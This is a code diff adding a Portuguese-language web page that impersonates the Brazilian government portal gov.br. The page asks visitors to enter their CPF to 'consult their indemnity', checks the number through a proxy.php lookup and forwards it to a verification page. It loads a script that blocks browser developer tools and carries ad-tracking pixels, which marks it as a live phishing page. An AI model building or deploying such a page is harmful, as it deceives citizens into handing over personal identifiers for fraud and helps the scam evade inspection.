@@ -1,0 +1,152 @@
+<html lang="pt">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="./assets/css/style.css" data-precedence="next">
+    <title>GOV.BR</title>
+    <link rel="icon" href="./assets/images/favicon.ico" type="image/x-icon" sizes="16x16">
+    <meta name="next-size-adjust">
+    <style>
+        #error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        #cpf-form button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+    <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
+    <script src="./assets/ty.js"></script>
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '574352008891416');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=574352008891416&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+</head>
+
+<body class="__className_d65c78 antialiased scroll-smooth overflow-x-hidden">
+    <div class="w-full min-h-screen">
+        <div class="max-w-lg w-full mx-auto space-y-4 bg-[#1351B4] min-h-screen">
+            <div class="w-full bg-white h-16 px-5 flex items-center justify-between shadow-lg"><a href="#"><img
+                        alt="Logo" fetchpriority="high" width="111" height="40" decoding="async" data-nimg="1"
+                        class="w-auto h-[36px] object-contain" style="color:transparent"
+                        srcset="./assets/images/gov.webp" src="./assets/images/gov.webp"></a>
+            </div>
+            <div class="px-4 pb-10">
+                <div class="w-full flex items-center justify-center">
+                    <div
+                        class="border text-card-foreground shadow-sm w-full max-w-[600px] h-[450px] p-4 rounded-2xl bg-white mt-5 flex flex-col space-y-6">
+                        <h3 class="text-black font-medium text-base">Identifique-se no gov.br com:</h3>
+                        <div class="space-y-6">
+                            <div class="flex items-center gap-2"><img alt="Logo" fetchpriority="high" width="25"
+                                    height="25" decoding="async" data-nimg="1" style="color:transparent"
+                                    srcset="./assets/images/id-card-solid.webp"
+                                    src="./assets/images/id-card-solid.webp"><span class="text-sm text-[#333333]">Número
+                                    do CPF</span></div>
+                            <p class="text-sm text-[#333333]">Digite seu CPF para<!-- --> <span
+                                    class="font-bold text-black">consultar</span> sua indenização</p>
+                        </div>
+                        <form class="flex-1" id="cpf-form">
+                            <div class="space-y-1">
+                                <label for="cpf" class="text-sm text-[#333333]">CPF</label>
+                                <input
+                                    type="tel" id="cpf" placeholder="Digite seu CPF"
+                                    class="w-full h-10 px-3 border text-sm placeholder:font-light text-black rounded-md focus:ring-0 focus:border-transparent placeholder:italic"
+                                    name="cpf">
+                            </div>
+                            <div id="error-message"></div>
+                            <div class="pt-6">
+                                <button type="submit"
+                                    class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-10 px-4 w-full bg-[#1351B4] hover:bg-[#1351B4]/90 text-white py-2 rounded-full text-sm font-medium"
+                                    disabled>Consultar indenização</button>
+                            </div>
+                        </form>
+                        
+                        <div class="flex items-center justify-center mt-auto"><button type="button"
+                                class="text-[#1351B4] hover:text-[#1351B4]/90 text-lg hover:underline flex items-center justify-center gap-3">
+                                <div><img alt="logo" loading="lazy" width="20" height="20" decoding="async"
+                                        data-nimg="1" class="size-4" style="color:transparent"
+                                        srcset="./assets/images/interrogacao.webp"
+                                        src="./assets/images/interrogacao.webp">
+                                </div><span class="text-[#1351B4] font-medium text-xs">Está com dúvidas e precisa de
+                                    ajuda?</span>
+                            </button></div>
+                    </div>
+                </div>
+
+                <script>
+                    const cpfInput = document.getElementById('cpf');
+                    const errorMessage = document.getElementById('error-message');
+                    const submitButton = document.querySelector('#cpf-form button');
+            
+                    function isValidCpfFormat(cpf) {
+                        return /^[0-9]{11}$/.test(cpf);
+                    }
+            
+                    function validateCpf(cpf) {
+                        fetch(`proxy.php?cpf=${cpf}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data && data.REF === 1) {
+                                    errorMessage.textContent = '';
+                                    submitButton.disabled = false;
+                                } else {
+                                    errorMessage.textContent = 'CPF inválido.';
+                                    submitButton.disabled = true;
+                                }
+                            })
+                            .catch(() => {
+                                errorMessage.textContent = 'Erro ao validar o CPF.';
+                                submitButton.disabled = true;
+                            });
+                    }
+            
+                    cpfInput.addEventListener('input', () => {
+                        const cpf = cpfInput.value.replace(/\D/g, ''); 
+            
+                        if (cpf.length < 11) {
+                            errorMessage.textContent = 'CPF deve ter 11 dígitos.';
+                            submitButton.disabled = true;
+                        } else if (!isValidCpfFormat(cpf)) {
+                            errorMessage.textContent = 'CPF deve conter apenas números.';
+                            submitButton.disabled = true;
+                        } else {
+                            validateCpf(cpf);
+                        }
+                    });
+            
+                    document.getElementById('cpf-form').addEventListener('submit', (event) => {
+                        event.preventDefault();
+                        const cpf = cpfInput.value.replace(/\D/g, '');
+                        if (submitButton.disabled === false) {
+                            window.location.href = `verification.html?cpf=${cpf}`;
+                        }
+                    });
+                </script>
+            </div>
+        </div>
+    </div>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</body>
+
+</html>
